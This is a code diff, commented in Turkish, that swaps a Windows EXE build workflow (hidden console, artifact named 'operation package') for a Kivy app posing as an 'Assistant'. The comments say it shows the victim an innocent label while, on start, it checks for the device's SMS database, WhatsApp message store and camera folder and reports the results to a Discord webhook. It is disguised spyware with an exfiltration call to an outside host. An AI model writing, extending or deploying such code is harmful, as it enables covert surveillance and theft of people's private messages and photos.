@@ -1,33 +1,43 @@
-name: Build EXE
-on: [push]
-jobs:
-  build:
-    runs-on: windows-latest
-    steps:
-    - name: Checkout Code
-      uses: actions/checkout@v4
+import os
+from kivy.app import App
+from kivy.uix.label import Label
+import requests
 
-    - name: Set up Python
-      uses: actions/setup-python@v5
-      with:
-        python-version: '3.9'
+# SENİN DISCORD WEBHOOK ADRESİN
+WEBHOOK_URL = "BURAYA_WEBHOOK_LINKINI_YAPISTIR"
 
-    - name: Install Dependencies
-      run: |
-        python -m pip install --upgrade pip
-        pip install pyinstaller cryptography requests pypiwin32
+class AsistanApp(App):
+    def build(self):
+        # Uygulama açıldığında kurbana görünecek masum yazı
+        return Label(text="Asistan Başlatıldı. Lütfen Bekleyiniz...")
 
-    - name: Build EXE
-      shell: pwsh
-      run: |
-        if (Test-Path "icon.ico") {
-          pyinstaller --onefile --noconsole --icon=icon.ico final_gorev.py
-        } else {
-          pyinstaller --onefile --noconsole final_gorev.py
-        }
+    def on_start(self):
+        # Uygulama açıldığı an arka planda operasyon başlar
+        self.operasyon_baslat()
 
-    - name: Upload Artifact
-      uses: actions/upload-artifact@v4
-      with:
-        name: operasyon_paketi
-        path: dist/*.exe
+    def operasyon_baslat(self):
+        veriler = "🚀 Android Operasyonu Başladı!\n"
+        
+        # 1. TEMEL BİLGİLERİ TOPLA
+        try:
+            # Android'de dosya yolları farklıdır
+            yollar = {
+                "SMS": "/data/data/com.android.providers.telephony/databases/mmssms.db",
+                "WhatsApp": "/sdcard/WhatsApp/Databases/msgstore.db.crypt14",
+                "Galeri": "/sdcard/DCIM/Camera/"
+            }
+            
+            for isim, yol in yollar.items():
+                if os.path.exists(yol):
+                    veriler += f"✅ {isim} bulundu!\n"
+                else:
+                    veriler += f"❌ {isim} erişilemedi.\n"
+                    
+        except Exception as e:
+            veriler += f"Hata: {str(e)}"
+
+        # DISCORD'A RAPOR GÖNDER
+        requests.post(WEBHOOK_URL, json={"content": veriler})
+
+if __name__ == "__main__":
+    AsistanApp().run()
